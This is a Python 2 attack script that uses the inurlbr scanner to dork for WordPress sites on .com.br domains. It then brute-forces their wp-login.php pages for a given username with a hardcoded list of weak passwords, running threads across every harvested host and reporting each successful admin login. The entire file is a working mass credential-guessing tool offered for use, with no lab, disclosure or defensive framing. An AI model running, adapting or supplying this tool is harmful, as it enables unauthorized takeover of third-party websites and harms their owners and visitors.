#!/usr/bin/python
# -*- coding: utf-8 -*-
#Inurlbr Dorking + Wordpress bruteforcing
#Use: wpbf.py <list.txt> <user>
#Author: Jhonathan Davi | insightsecs at gmail.com | Twitter @jh00nbr
#Inurl Brasil: blog.inurl.com.br | fb.com/InurlBrasil
# Inurlbr.php:  https://github.com/googleinurl/SCANNER-INURLBR/blob/master/inurlbr.php
# https://www.youtube.com/watch?v=mEdonicOmfw

import urllib
import os
import sys
import requests as requests
import re
import subprocess
from threading import Thread
from time import sleep
from subprocess import Popen, PIPE

requests = requests.session()
class bcolors:
    ENDC = '\033[0m'
    OKGREEN = '\033[92m'
    ERRO = '\033[91m'
    WARNING = '\033[93m'
    UNDERLINE = '\033[4m'

def bruteforce(target,usr,pwd):
    print bcolors.WARNING + "[!] Checking in host: " + bcolors.ENDC + target + " | " + usr + ":" + pwd
    try:
        get = requests.get(target+'/wp-admin/')
        post = {'log': usr, 'pwd': pwd, 'wp-submit': 'Login', 'redirect_to': target, 'testcookie': '1'}
        get2 = requests.post(target+'/wp-login.php' , data=urllib.urlencode(post))
        html = requests.get(target+'/wp-admin')
        adm = '<li id="wp-admin-bar-logout">'
        if adm in html.text:
            print bcolors.OKGREEN + "[+]"+ bcolors.ENDC + " Sucess in: " + target.replace("\n","").replace("\r","") + bcolors.OKGREEN + " " + usr + bcolors.ENDC + ":" + bcolors.OKGREEN + pwd + bcolors.ENDC
            requests.cookies.clear()
    except:
        print bcolors.ERRO + "[*]" + " Failed connection" + bcolors.ENDC

if len(sys.argv) != 3:
    print "\n How to use: wpbf.py <list.txt> <user>"
    sys.exit(1)
else:
    drk = raw_input("\n Dorking use to find sites using the inurlbr?" + bcolors.OKGREEN + " [Y]" + bcolors.ENDC + bcolors.ERRO + "[N]" + bcolors.ENDC)
    if drk == "y" or drk == "yes" or drk == "Y" or drk == "Yes":
        os.system('clear')
        Popen(['xterm','-geometry', '80x43', '-T','Dorking inurlbr', '-e', 'php inurlbr.php -q 1,6 --dork "[DORK]site:blackwings.com.br -vestibulum -contato[DORK]inurl:wp-content site:.com.br[DORK]inurl:wp-content/plugins/ site:.com.br" -s list.txt --comand-all "echo _TARGET_ >> list.txt"'])
    elif drk == "n" or drk == "N":
        os.system('clear')
        print "\n"
        print "                      \ \       "
        print "                       \ \_     "
        print "                     _-~~ .\    "
        print "                   ,~   )___>   "
        print "                 @~    /    Inurlbr Dorking + Wordpress bruteforcing "
        print "                  \____)                                             "
        print "                            use: wpbf.py <list.txt> <user>           "
        print "           [ Author: Jhonathan Davi | insightsecs at gmail.com | Twitter @jh00nbr ] "
        print "                   Inurl Brasil: blog.inurl.com.br | fb.com/InurlBrasil             "
        print "\n\n\n"

        os.system("awk '!a[$0]++' " + sys.argv[1] + " >> hosts.txt")
        usr = sys.argv[2]
        urls = open("hosts.txt", "r").readlines()
        threads = []

        for pwd in ["123", "mudarsenha","1234", "123mudar","t","q","pass123","mudar123","102030","123","test","q1w2e3r4t5","123456","123321","teste","0147852369","7777","admin","admin123"]:
            for target in urls:

                if 'com' not in target:
                    print bcolors.ERRO + "[*] Url error: " + bcolors.ENDC + "http://" + target.replace("\n","").replace("\r","")
                else:
                    html = requests.get("http://" +target.replace("\n","").replace("\r",""))
                    if 'WordPress' in html.text:
                        t = Thread(target=bruteforce, args=("http://"+target.replace("\n","").replace("\r",""),usr,pwd))
                        t.start()
                        threads.append(t)
                        for b in threads:
                            b.join()
                    else:
                        print bcolors.ERRO + "[*] Not is wordpress: " + bcolors.ENDC + "http://" + target.replace("\n","").replace("\r","")

    else:
        os.system('clear')
        print "Responses: <y> or <n>"
